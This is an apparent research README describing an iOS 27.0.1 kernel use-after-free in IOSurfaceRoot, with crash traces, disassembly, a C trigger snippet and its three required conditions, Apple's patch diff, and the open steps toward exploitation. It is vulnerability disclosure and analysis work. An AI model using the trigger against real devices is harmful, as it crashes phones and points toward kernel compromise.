# iOS 27.0.1 — IOSurface 内核 UAF 及攻击面测绘笔记

> 针对 **iOS 27.0.1 (24A446) / iPhone 17 Pro Max (iPhone18,2)** 的公开研究笔记。
> 记录一个**无特权 app 可达的内核 use-after-free**，以及在同类攻击面上系统性排除的数百个候选。
> 全部结论来自真机实测 + 内核缓存静态差分，**未使用任何非公开接口**。

---

## 发现摘要

**`IOSurfaceRoot` 内核用户客户端在 selector 17 注册 surface 后，若 surface 被释放而注册表节点未摘除，节点持有的 `owner` 指针悬空。此后任一次注册表遍历都会解引用它 —— 内核内存标记（MTE）判定 UAF 并 panic。**

真机 **4/4 复现**，同一指令，跨 4 次独立启动 / 4 个 KASLR slide / 4 个 CPU：

| # | slide | pc（静态） | lr（静态） | CPU |
|---|---|---|---|---|
| 1 | `0x3e48c000` | `0xfffffe000a34ff88` | `0xa346338` | 0 |
| 2 | `0x2eb20000` | `0xfffffe000a34ff88` | `0xa346338` | 3 |
| 3 | `0x4686c000` | `0xfffffe000a34ff88` | `0xa346338` | 1 |
| 4 | `0x2f420000` | `0xfffffe000a34ff88` | `0xa346338` | 0 |

```
0xa346324  ldr x0,[x22,#0x58]    ; node->owner = 已释放的 surface
0xa346334  bl  0xa34ff4c         ; lr = 0xa346338
0xa34ff88  ldr x0,[x0,#0xd8]     ; 取 owner 的锁 → tag 失配
```

**完整触发方法见 [`out/RESEARCH-IOSURFACE-UAF.md`](out/RESEARCH-IOSURFACE-UAF.md)。**

---

## 触发要点（详见研究报告）

```c
IOServiceOpen(svc, mach_task_self(), 0, &c);                 // IOSurfaceRoot
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);

uint64_t in[3] = {1,2,3}, ref = 0x1122334455667788ull;
uint32_t soc;
IOConnectCallAsyncMethod(c, 17, wp, &ref, 1, NULL,0,
                         in, 24, NULL, &soc, NULL, NULL);    // ★ 必须 async

IOSurfaceRef s = IOSurfaceCreate(64x4 BGRA);
// 4 线程并发 IOSurfaceLock / IOSurfaceUnlock
usleep(200 + (iter%40)*25);
IOServiceClose(c);                                            // ★ 第 100 次迭代命中
usleep(300); /* 停线程 */ CFRelease(s);
```

**三个缺一不可的条件：**

1. **必须 `IOConnectCallAsyncMethod`** —— handler 是 `ldr x1,[args+0x10]; cbz -> kIOReturnBadArgument`，
   `args+0x10`（reference 数组）只有 async 路径会填，同步恒 `0xE00002C2`
2. **`refCnt=1` 且 `ref` 非 0**
3. **`IOServiceClose` 必须早于 `CFRelease(surface)`**

---

## Apple 的修补（27.2）

| 位置 | 改动 |
|---|---|
| `#802`（注销） | 锁内 `mov w8,#1; strb w8,[self,#0xf1]` —— 打「已注销」粘滞标记 |
| `#799`（注册） | 锁内 `ldrb w8,[self,#0xf1]; tbz` → 否则 `kIOReturnNotAttached (0xE00002D8)` |
| `#802` 位置 | 从 teardown 末尾**提到最前** |

`+0xf1` 的全 cache 访问数：**27.0.1 = 0，27.2 = 2**。
27.0.1 在「清 `+0xf0`」与「摘链」之间夹了两次函数调用，竞态窗口由此而来。

---

## 当前边界

**已确证**：确定性内核 UAF、无特权入口、4/4 复现、单点指令。
**未完成**：对象不可控，目前只能稳定触发 panic。转成可用原语还需要

1. 在 free 与 teardown 之间用同 size class 抢占被释放的内存
2. 让 `node->owner` 指向受控内容
3. **解决 MTE 的 tag 一致性** —— 内核内存标记会让「指针换对象」直接变成 tag 失配

**这不是一条已完成的利用链。** 请按「确定性 UAF + 待解决的利用障碍」来读。

---

## 仓库结构

```
out/          研究笔记（135 篇）
  RESEARCH-IOSURFACE-UAF.md   ★ 主报告：本漏洞的完整触发方法与证据
  RULES.md                    工作纪律
  TOOLING-PITFALLS.md         会造成假阴性的工具坑
  RECORD-CORRECTIONS.md       被推翻的中间结论
  MFB-CONTRACT.md             47 个 MFB selector 契约
  ENT-MAP.md                  entitlement 门静态证伪
harness/      各探针的 Objective-C 源码（含打出 panic 的那一版）
tools/        内核缓存差分 / 调用图 / 派发表分析脚本
```

---

## 方法论：三条值得记住的坑

1. **selector 的参数契约必须从 handler 反汇编读**，不能按 `IOConnectCallMethod` 的常规签名猜。
   `args+0x10`（reference 数组）只存在于 async 路径，猜错就会得到「恒 BadArgument」的假死结论。
2. **「同步打不通」≠「不可达」** —— 本项目曾因这条把整条线判死，后来才发现只是调用形态不对。
3. **`IOConnectCallMethod` 的输出参数是 in/out**，`scalarOutputCount`/`structOutputSize` 是
   **精确匹配**的派发键：太大 `0xE00002C2`、太小 `0xE00002C7`。不是「至少」，不是「填大点就行」。

### 关于源码版本

**迭代只新建，不覆盖**（见 `out/RULES.md` R1）。
本项目曾因一次覆盖丢失了一个已验证的内核 UAF 源码，三天后靠翻会话记录才逐字找回。
`harness/israce/main.panic.m` 那一版就是靠这个方法恢复的 —— 它是唯一仍含 `newWakePort` 的版本。

---

## 免责声明

本项目为**安全研究**目的：理解 iOS 内核在表面加固后的剩余攻击面。
内容面向从事同类研究的安全人员、CTF 参赛者、以及需要评估这些组件风险的用户。

- 未包含任何可利用的完整攻击链
- 未包含武器化代码，探针只做到「触发崩溃并记录现场」
- 所有测试均在研究者自有设备上进行

如你是 Apple 安全团队并希望补充细节，欢迎提 issue。
